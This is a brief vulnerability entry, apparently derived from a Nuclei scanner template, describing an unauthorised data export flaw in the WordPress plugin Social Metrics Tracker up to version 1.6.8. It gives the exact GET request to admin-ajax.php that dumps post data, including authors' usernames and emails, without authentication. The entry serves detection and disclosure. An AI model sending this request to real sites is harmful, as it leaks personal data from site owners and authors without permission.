# Vulnerability: Social Metrics Tracker <= 1.6.8 - Unauthorised Data Export
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wordpress-social-metrics-tracker.yaml`)

## Description
The lack of proper authorisation when exporting data from the plugin could allow unauthenticated users to get information about the posts and page of the blog, including their author's username and email.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1
```

